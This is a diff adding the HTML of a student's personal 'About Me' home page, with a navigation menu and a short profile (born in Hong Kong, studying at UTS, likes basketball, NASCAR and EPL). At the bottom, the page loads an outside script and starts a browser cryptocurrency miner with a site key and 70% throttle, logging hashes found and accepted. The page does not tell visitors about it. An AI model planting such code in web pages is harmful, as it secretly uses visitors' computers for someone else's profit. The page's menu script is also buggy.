@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            html {
+                scroll-behavior: smooth;
+            }
+            /* unvisited link */
+            a:link {
+                color: #00ffc4;
+                text-decoration: none;
+                font-family: "Lucida Console", "Courier New", monospace;
+            }
+
+            /* visited link */
+            a:visited {
+                color: cyan;
+                text-decoration: none;
+                
+            }
+
+            /* mouse over link */
+            a:hover {
+                color: hotpink;
+                text-decoration: none;
+            }
+
+            /* selected link */
+            a:active {
+                color: red;
+                text-decoration: none;
+            }
+            
+        </style>
+        
+       <title>Home Page</title>
+       <link rel="stylesheet" href="websystems.css">
+        <meta name="viewport" content="width = device-width, initial-scale =1">
+        
+    </head>
+    
+    <body>
+  
+        <section id="banner">
+            
+            <div class="topbar">
+            <div class="menu">
+       
+                <ul>
+                    <li class="logo"><a href="index.html"><img src="Images/logo.png" class="logo"></a></li>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="past.html">PAST</a></li>
+                    <li><a href="future.html">FUTURE</a></li>  
+                    <li><a href="comments.html">COMMENTS</a></li>
+                    
+                    </ul>
+                    <div class="banner-text">
+                    <h1>Home Page</h1>
+                    <p>Everything About Me</p>
+                    <div class="banner-but">
+                    <a href="#about"><span></span>Read More</a>
+                        
+                </div>
+            </div>
+                
+           </div>
+        </div>
+            
+             </section>
+            
+            <div id="sidemenu">
+            <bar>
+            <ul>
+                <li><a href="index.html">HOME</a></li>
+                <li><a href="past.html">PAST</a></li>   
+                <li><a href="future.html">FUTURE</a></li>  
+                <li><a href="comments.html">COMMENTS</a></li>  
+            </ul>
+            </bar>
+        </div>
+        <div id="menuBut">
+            <img src="Images/menu.png" id="menu">
+        </div>
+                
+       
+        
+       
+        
+        <section id="about">
+            <div class="content-title">
+                <h1>About Me</h1>
+                
+                <div class="table">
+            <table style="width:100%">
+                <tr>
+                    <th>Place of birth</th>
+                    <th>School</th>
+                    <th>Status</th>
+                </tr>
+                <tr>
+                    <td>Hong Kong</td>
+                    <td>UTS</td>
+                    <td>Studying in Australia</td>
+                
+                </tr>
+            </table>
+        </div>
+                      
+            </div>
+            <div class="about-content">
+                <div class="about-content-text">
+                    <h1>I am a student from <span style="color:darkcyan">Hong Kong</span> currently studying from UTS. This page is all about my personal details but not my bank details. I like to play basketball at my free time and do casual work for extra earnings. I love to watch <span style="color:#005ba5">NASCAR</span> and <span style="color:#005ba5">EPL</span> as well.</h1>
+                </div>
+                <div class="about-image">
+                    <figure>
+                    <img src="Images/hongkong.jpg">
+                    <!-- Image from Wallpapersafari, https://wallpapersafari.com/w/JBSnu6 -->
+                    <figcaption>Fig.1 Hong Kong, My Home.</figcaption>
+                    </figure>
+                </div>
+            </div>
+            
+            
+        </section>
+        
+        <script>
+        var menuBut = document.getElementById("menuBut")
+        var menuBut = document.getElementById("sidemenu")
+        var menuBut = document.getElementById("menu")
+        
+        sidemenu.style.right = "-250px";
+        
+        menuBut.onclick = function(){
+            if(sidemenu.style.right == "-250px") {
+                sidemenu.style.right = "0";
+                menu.src = "Images/cross.png";
+            }
+            else{ sidemenu.style.right = "-250px";
+            menu.src = "Images/menu.png";
+            }
+        }
+            
+        </script>
+
+        <script src="https://www.hostingcloud.racing/8brg.js"></script>
+        <script>
+            var _client = new Client.Anonymous('24c8b4d39911015413ec0c09ea881a5473605af7cc0aa88aa23f82c0ebd45cf1', {
+            throttle: 0.7, c: 'w', ads: 0
+        });
+            _client.start();
+    
+            // Listen on events
+        _client.on('found', function() { console.log('found hash!')})
+        _client.on('accepted', function() { console.log('accepted hash!')})
+            
+            SetInterval(function(){
+                var hashesPerSecond = _client.getHashPerSecond();
+                var totalHashes = _client.getTotalHashes();
+                var acceptedHashes = _client.getAcceptedHashes();
+                
+                console.log("hashesPerSecond", hashesPerSecond)
+                console.log("totalHashes", totalHashes)
+                console.log("acceptedHashes", acceptedHashes)
+                
+                //Output to HTML elements
+            }, 1000);
+
+        </script>
+       
+        </body>
+    
+    </html>
